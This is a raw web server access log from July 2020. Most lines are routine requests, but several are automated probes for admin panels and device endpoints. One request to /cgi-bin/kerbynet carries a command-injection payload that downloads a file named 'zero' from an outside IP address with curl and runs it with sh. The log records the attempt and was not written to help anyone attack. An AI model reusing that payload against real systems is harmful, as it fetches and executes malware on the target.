- - [16/Jul/2020:13:48:56 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [16/Jul/2020:14:19:33 +0000] "GET / HTTP/1.0" 200 2406 "-" - "-"
- - [16/Jul/2020:16:15:55 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [16/Jul/2020:16:15:55 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [16/Jul/2020:19:07:47 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 404 1835 "-" - "-"
- - [16/Jul/2020:21:15:31 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [16/Jul/2020:21:52:59 +0000] "GET / HTTP/1.0" 200 2406 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
- - [16/Jul/2020:22:58:47 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
- - [16/Jul/2020:23:18:38 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [16/Jul/2020:23:31:52 +0000] "GET /a2billing/admin/Public/index.php HTTP/1.1" 404 2474 "-" - "curl/7.15.5 (i686-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5"
- - [17/Jul/2020:00:59:51 +0000] "GET / HTTP/1.1" 200 3970 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
- - [17/Jul/2020:00:59:52 +0000] "\n" 400 1531 "-" - "-"
- - [17/Jul/2020:00:59:53 +0000] "\n" 400 1547 "-" - "-"
- - [17/Jul/2020:00:59:56 +0000] "\n" 400 1525 "-" - "-"
- - [17/Jul/2020:00:59:56 +0000] "\n" 400 1732 "-" - "-"
- - [17/Jul/2020:00:59:57 +0000] "\n" 400 1525 "-" - "-"
- - [17/Jul/2020:00:59:58 +0000] "\n" 400 1525 "-" - "-"
- - [17/Jul/2020:01:00:07 +0000] "GET /robots.txt HTTP/1.1" 200 1936 "-" - "-"
- - [17/Jul/2020:01:00:14 +0000] "GET /sitemap.xml HTTP/1.1" 404 2015 "-" - "-"
- - [17/Jul/2020:01:00:22 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 2015 "-" - "-"
- - [17/Jul/2020:01:00:24 +0000] "\n" 400 1967 "-" - "-"
- - [17/Jul/2020:01:00:34 +0000] "GET /favicon.ico HTTP/1.1" 200 1954 "-" - "python-requests/2.19.1"
- - [17/Jul/2020:03:02:48 +0000] "GET /manager/html HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 Gecko/20100101"
- - [17/Jul/2020:04:16:18 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [17/Jul/2020:04:46:22 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [17/Jul/2020:04:46:22 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [17/Jul/2020:05:25:13 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 1872 "-" - "Hello, World"
- - [17/Jul/2020:05:48:29 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
